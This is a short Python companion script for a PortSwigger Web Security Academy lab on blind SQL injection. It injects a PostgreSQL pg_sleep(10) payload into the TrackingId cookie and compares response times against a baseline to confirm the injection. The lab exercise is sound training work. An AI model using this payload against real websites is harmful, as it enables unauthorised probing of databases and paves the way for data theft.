#!/usr/bin/env python3
"""
Blind SQL injection with time delays
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 14-blind-time-delays.md

What this does:
    Appends a PostgreSQL pg_sleep(10) call onto the TrackingId cookie and
    measures the response time. No data extraction is required for this lab
    -- a measured ~10 second delay against a sub-second baseline is itself
    the solve condition.

Usage:
    python 14-blind-time-delays.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import time
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=30)
    seed = client.get(lab_url)
    tracking_id = seed.cookies.get("TrackingId", "x")
    session = seed.cookies.get("session", "")

    t0 = time.time()
    client.get(lab_url, headers={"Cookie": f"TrackingId={tracking_id}; session={session}"})
    baseline = time.time() - t0
    print(f"[*] Baseline response time: {baseline:.2f}s")

    payload = f"{tracking_id}'||pg_sleep(10)-- "
    t0 = time.time()
    client.get(lab_url, headers={"Cookie": f"TrackingId={payload}; session={session}"})
    elapsed = time.time() - t0
    print(f"[*] Injected response time: {elapsed:.2f}s")

    if elapsed >= 9:
        print("[+] Time-based injection confirmed -- lab should now be solved.")
    else:
        print("[-] No measurable delay -- injection may not have fired.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
